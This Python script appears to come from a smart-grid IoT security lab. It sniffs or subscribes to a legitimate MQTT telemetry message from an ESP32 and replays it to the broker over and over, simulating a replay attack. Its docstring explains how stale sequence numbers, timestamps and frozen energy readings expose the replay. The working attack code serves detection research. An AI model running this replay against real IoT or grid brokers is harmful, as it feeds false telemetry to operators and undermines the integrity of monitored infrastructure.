#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  MODULE BRIEFING: attack_replay.py — Replay Attack Simulator               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  PURPOSE:   Capture a legitimate MQTT packet from the ESP32 and replay it  ║
║             repeatedly to the broker, simulating a replay/freeze attack.   ║
║  INPUTS:    CLI args (duration, interval)                                  ║
║  OUTPUTS:   Replayed packets sent to MQTT broker                           ║
║  REQUIRES:  sudo, Scapy, Linux with raw socket permissions                ║
╚══════════════════════════════════════════════════════════════════════════════╝

RESEARCH DISCLAIMER:
    This script is for academic research purposes only.
    Use only on networks and devices you own and control.
    Replay attacks on public networks is illegal.
    This testbed is isolated to a local lab network (10.59.53.0/24).

WHAT THIS SCRIPT DOES:
    Phase A — CAPTURE: Sniff one legitimate MQTT PUBLISH packet from the real
              ESP32 to the broker (10.59.53.30:1883).
    Phase B — REPLAY: Send that exact same packet over and over.

WHY THIS IS DETECTABLE:
    - Sequence number (seq) in the JSON payload never increments
    - Timestamp in the JSON payload is stale (doesn't match wall clock)
    - Energy accumulation (energy_Wh) never increases
    - HMAC is technically valid (it was signed by the real ESP32) but the
      timestamp/seq staleness gives it away
"""

import argparse
import sys
import time
from datetime import datetime

try:
    from scapy.all import (
        IP, TCP, Raw, Ether,
        sniff as scapy_sniff,
        send, sendp,
        conf
    )
except ImportError:
    IP = TCP = Raw = Ether = scapy_sniff = send = sendp = conf = None

try:
    import paho.mqtt.subscribe as mqtt_sub
    import paho.mqtt.publish as mqtt_publish
except ImportError:
    mqtt_sub = None
    mqtt_publish = None

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════

ESP32_IP = "10.59.53.251"
BROKER_IP = "10.59.53.30"
BROKER_PORT = 1883
MQTT_TOPIC = "smartgrid/node01/telemetry"
CAPTURE_TIMEOUT = 30  # seconds to wait for a legitimate packet


# ═══════════════════════════════════════════════════════
# PHASE A — PACKET CAPTURE
# ═══════════════════════════════════════════════════════

def capture_legitimate_packet(timeout: int = CAPTURE_TIMEOUT):
    """
    Capture one legitimate MQTT packet from the ESP32.
    First attempts direct broker subscription (100% reliable on Wi-Fi),
    with fallback to Scapy sniffing.
    """
    print(f"[CAPTURE] Listening for legitimate ESP32 packet on topic '{MQTT_TOPIC}'...")
    print(f"[CAPTURE] Target broker: {BROKER_IP}:{BROKER_PORT} | Expected Node IP: {ESP32_IP}")
    print(f"[CAPTURE] Timeout: {timeout}s")
    print("-" * 60)
    
    # Method 1: Capture via MQTT subscription from broker (reliable over Wi-Fi)
    if mqtt_sub:
        try:
            print("[CAPTURE] Subscribing to MQTT broker to grab real ESP32 packet...")
            msg = mqtt_sub.simple(
                MQTT_TOPIC,
                hostname=BROKER_IP,
                port=BROKER_PORT,
                timeout=timeout
            )
            if msg:
                payload_str = msg.payload.decode('utf-8', errors='ignore')
                print(f"[CAPTURE] ✓ Captured legitimate MQTT packet from broker!")
                print(f"[CAPTURE]   Size: {len(msg.payload)} bytes")
                print(f"[CAPTURE]   Payload snippet: {payload_str[:80]}...")
                return {"payload": payload_str, "scapy_pkt": None}
        except Exception as e:
            print(f"[CAPTURE] MQTT subscription capture attempt note: {e}")
    
    # Method 2: Scapy packet sniffing (fallback)
    if scapy_sniff:
        captured = []
        def capture_callback(pkt):
            if pkt.haslayer(Raw):
                raw_data = bytes(pkt[Raw].load)
                if len(raw_data) > 2 and (raw_data[0] & 0xF0) == 0x30:
                    captured.append(pkt)
                    return True
            return False
        
        try:
            scapy_sniff(
                filter=f"tcp and src host {ESP32_IP} and dst port {BROKER_PORT}",
                prn=capture_callback,
                stop_filter=lambda pkt: len(captured) > 0,
                count=10,
                timeout=timeout,
                store=False
            )
            if captured:
                pkt = captured[0]
                raw_data = bytes(pkt[Raw].load)
                payload_str = raw_data.decode('utf-8', errors='ignore')
                json_start = payload_str.find('{')
                clean_payload = payload_str[json_start:] if json_start >= 0 else payload_str
                print(f"[CAPTURE] ✓ Captured MQTT packet via Scapy sniffer!")
                return {"payload": clean_payload, "scapy_pkt": pkt}
        except Exception as e:
            print(f"[CAPTURE] Scapy sniff failed: {e}")
            
    print(f"[CAPTURE] ✗ No MQTT packets captured within {timeout}s timeout.")
    print(f"[CAPTURE]   Make sure the ESP32 is powered on and publishing.")
    return None


# ═══════════════════════════════════════════════════════
# PHASE B — REPLAY LOOP
# ═══════════════════════════════════════════════════════

def replay_packet(capture_result, duration: int = 60, interval: float = 5.0):
    """
    Replay a captured packet repeatedly.
    
    Replays the exact captured payload (valid HMAC, but STALE sequence/timestamp)
    directly to the MQTT broker so the detection pipeline processes it.
    """
    start_time = time.time()
    end_time = start_time + duration
    replay_count = 0
    
    payload_str = capture_result.get("payload") if isinstance(capture_result, dict) else None
    scapy_pkt = capture_result.get("scapy_pkt") if isinstance(capture_result, dict) else capture_result
    
    print(f"\n[REPLAY] Starting replay attack")
    print(f"[REPLAY] Duration: {duration}s | Interval: {interval}s")
    print(f"[REPLAY] Expected replays: ~{int(duration / interval)}")
    print("-" * 60)
    
    try:
        while time.time() < end_time:
            replayed = False
            
            # Replay via MQTT client (guaranteed delivery to broker pipeline)
            if payload_str and mqtt_publish:
                try:
                    mqtt_publish.single(
                        topic=MQTT_TOPIC,
                        payload=payload_str,
                        hostname=BROKER_IP,
                        port=BROKER_PORT,
                        client_id="replay_attacker"
                    )
                    replayed = True
                except Exception as e:
                    print(f"[REPLAY] MQTT publish error: {e}")
            
            # Also send raw packet if Scapy is available
            if scapy_pkt and send and hasattr(scapy_pkt, 'haslayer') and scapy_pkt.haslayer(IP):
                try:
                    replay_pkt = IP(bytes(scapy_pkt[IP]))
                    del replay_pkt[IP].chksum
                    if replay_pkt.haslayer(TCP):
                        del replay_pkt[TCP].chksum
                    send(replay_pkt, verbose=False)
                    replayed = True
                except Exception:
                    pass
            
            if replayed:
                replay_count += 1
                remaining = int(end_time - time.time())
                ts = datetime.now().strftime('%H:%M:%S')
                print(f"[REPLAY] {ts} | Replay #{replay_count:>4} | "
                      f"src={ESP32_IP}(original) -> {BROKER_IP}:{BROKER_PORT} | "
                      f"STALE seq/timestamp | remaining={remaining}s")
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n[REPLAY] Interrupted by user (Ctrl+C)")
    
    elapsed = time.time() - start_time
    print("-" * 60)
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                   REPLAY ATTACK SUMMARY                     ║
╠══════════════════════════════════════════════════════════════╣
║  Duration:         {elapsed:.1f}s{' '*(40-len(f'{elapsed:.1f}'))}║
║  Packets Replayed: {replay_count:<41}║
║  Source IP:        {ESP32_IP} (legitimate — that's the point){' '*(6)}║
║  Detection Tell:   Stale seq + timestamp + frozen energy    ║
╚══════════════════════════════════════════════════════════════╝
""")


# ═══════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="SmartGrid Replay Attack Simulator (Research Only)",
        epilog="MUST be run with sudo on Linux. Lab network only."
    )
    parser.add_argument('--duration', type=int, default=60,
                        help='Replay duration in seconds (default: 60)')
    parser.add_argument('--interval', type=float, default=5.0,
                        help='Seconds between replays (default: 5.0)')
    parser.add_argument('--capture-timeout', type=int, default=30,
                        help='Max seconds to wait for initial capture (default: 30)')
    
    args = parser.parse_args()
    
    # Check for root
    import os
    if os.geteuid() != 0:
        print("[ERROR] This script requires root privileges.")
        print("[ERROR] Run with: sudo python3 attack_replay.py")
        sys.exit(1)
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║            SmartGrid Replay Attack Simulator                ║
║                  RESEARCH USE ONLY                          ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    # Phase A: Capture
    packet = capture_legitimate_packet(timeout=args.capture_timeout)
    
    if packet is None:
        print("[ABORT] No packet captured. Exiting.")
        sys.exit(1)
    
    # Phase B: Replay
    replay_packet(packet, duration=args.duration, interval=args.interval)


if __name__ == "__main__":
    main()
